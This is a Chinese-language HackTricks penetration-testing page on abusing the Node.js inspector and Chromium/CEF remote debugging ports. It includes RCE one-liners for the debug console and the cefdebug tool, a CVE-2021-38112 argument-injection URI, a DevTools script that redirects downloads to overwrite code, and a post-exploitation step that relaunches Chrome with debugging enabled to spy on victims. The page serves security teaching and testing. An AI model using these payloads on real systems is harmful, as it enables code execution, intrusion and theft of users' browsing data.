# Node inspector/CEF 调试滥用

<details>

<summary><strong>从零到英雄学习 AWS 黑客攻击，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

使用 `--inspect` 开关启动时，Node.js 进程会监听调试客户端。**默认情况下**，它将在主机和端口 **`127.0.0.1:9229`** 上监听。每个进程也会被分配一个**唯一的** **UUID**。

Inspector 客户端必须知道并指定主机地址、端口和 UUID 才能连接。完整的 URL 看起来像这样 `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`。

{% hint style="warning" %}
由于 **调试器可以完全访问 Node.js 执行环境**，能够连接到此端口的恶意行为者可能能够代表 Node.js 进程执行任意代码（**潜在的权限提升**）。
{% endhint %}

有几种方法可以启动 inspector：
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
当您启动一个被检查的进程时，会出现类似这样的内容：
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
基于 **CEF** (**Chromium Embedded Framework**) 的进程需要使用参数：`--remote-debugging-port=9222` 来打开**调试器**（SSRF 保护措施仍然非常相似）。然而，它们**不是**提供一个 **NodeJS** **调试**会话，而是会使用 [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) 与浏览器通信，这是一个控制浏览器的接口，但并没有直接的 RCE。

当你启动一个被调试的浏览器时，会出现类似这样的内容：
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### 浏览器、WebSockets 和同源策略 <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

在网页浏览器中打开的网站可以在浏览器安全模型下发起 WebSocket 和 HTTP 请求。需要一个**初始的 HTTP 连接**来**获取唯一的调试器会话 ID**。**同源策略**阻止网站能够建立**此 HTTP 连接**。为了增加安全性，防止[**DNS 重绑定攻击**](https://en.wikipedia.org/wiki/DNS\_rebinding)，Node.js 验证连接的**'Host' 头部**要么指定一个**IP 地址**，要么精确指定**`localhost`** 或 **`localhost6`**。

{% hint style="info" %}
这项**安全措施防止了利用检查器执行代码**，仅通过**发送 HTTP 请求**（这可以通过利用 SSRF 漏洞来完成）。
{% endhint %}

### 在运行中的进程启动检查器

你可以向运行中的 nodejs 进程发送**信号 SIGUSR1**，使其在默认端口**启动检查器**。然而，请注意，你需要有足够的权限，所以这可能会授予你**访问进程内部信息的特权**，但不直接提升权限。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
这在容器中很有用，因为**关闭进程并以 `--inspect` 启动新进程**不是一个选项，因为**容器**会随着进程一起被**终止**。
{% endhint %}

### 连接到检查器/调试器

如果您可以访问基于**Chromium**的浏览器，您可以通过在 Chrome 中访问 `chrome://inspect` 或在 Edge 中访问 `edge://inspect` 来连接。点击配置按钮并确保您的**目标主机和端口**被列出（在下一节的示例中找到如何使用其中一个示例获取 RCE 的示例图片）。

![](<../../.gitbook/assets/image (620) (1).png>)

使用**命令行**，您可以连接到调试器/检查器：
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
工具 [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug)，允许**查找**本地运行的**inspectors**并**注入代码**。
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
请注意，如果通过[**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/)连接到浏览器，**NodeJS RCE漏洞利用将不起作用**（您需要检查API以找到有趣的事情来使用它）。
{% endhint %}

## NodeJS调试器/检查器中的RCE

{% hint style="info" %}
如果您是来这里寻找如何从Electron中的XSS获取[**RCE，请查看此页面。**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

当您可以**连接**到Node**检查器**时，一些常见的获取**RCE**的方法是使用类似的东西（看起来这在连接到Chrome DevTools协议时**不会起作用**）：
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools 协议有效载荷

您可以在此处检查 API：[https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
在本节中，我将仅列出我发现人们用来利用此协议的有趣事物。

### 通过深度链接的参数注入

在 [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) 中，Rhino 安全发现基于 CEF 的应用程序**在系统中注册了一个自定义 URI**（workspaces://），它接收完整的 URI，然后**启动基于 CEF 的应用程序**，其配置部分是根据该 URI 构建的。

研究发现，URI 参数被 URL 解码并用于启动基于 CEF 的应用程序，允许用户在**命令行**中**注入**标志 **`--gpu-launcher`** 并执行任意内容。

因此，像这样的有效载荷：
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
将执行 calc.exe。

### 覆盖文件

更改**下载文件保存的文件夹**，并下载文件以**覆盖**应用程序中经常使用的**源代码**，用您的**恶意代码**。
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE 和 数据泄露

根据这篇文章：[https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)，可以实现 RCE 并从 theriver 泄露内部页面。

### 后期利用

在真实环境中，**在攻破**使用基于 Chrome/Chromium 浏览器的用户 PC 后，你可以启动一个带有**调试激活的 Chrome 进程并端口转发调试端口**，这样你就可以访问它。通过这种方式，你将能够**检查受害者使用 Chrome 时的所有操作并窃取敏感信息**。

隐蔽的方法是**终止所有 Chrome 进程**，然后调用类似
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## 参考资料

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击技巧！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks**中看到您的**公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
